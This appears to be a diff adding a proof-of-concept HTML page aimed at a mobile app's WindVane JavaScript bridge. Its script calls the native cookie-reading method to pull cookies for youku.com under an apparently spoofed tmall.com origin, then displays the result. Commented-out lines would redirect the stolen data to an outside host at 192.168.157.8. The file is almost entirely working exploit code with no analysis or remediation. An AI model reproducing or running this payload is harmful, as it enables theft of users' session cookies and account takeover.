@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TEST</title>
+<style>
+body {
+font-family: Arial, sans-serif;
+margin: 20px;
+}
+.info {
+margin-bottom: 20px;
+}
+button {
+padding: 10px 20px;
+font-size: 16px;
+cursor: pointer;
+margin-right: 10px;
+}
+</style>
+</head>
+<body>
+<script>
+window.onload = function() {
+if (window.__windvane__) {
+window.__windvane__.onSuccess = function(wvapi, data) {
+alert("data " + JSON.stringify(data));
+//document.location.href = "http://192.168.157.8/get_js?data=" + data;
+};
+window.__windvane__.onFailure = function(wvapi, data) {
+alert("data " + JSON.stringify(data));
+//document.location.href = "http://192.168.157.8/get_js?data=" + data;
+};
+}
+};
+var cookie_params = {
+url: "www.youku.com"
+};
+window.__windvane__.nativeCall('WVCookie.readCookies', JSON.stringify(cookie_params), "wvapi:123", "https://equity.tmall.com");
+</script>
+</body>
+</html>
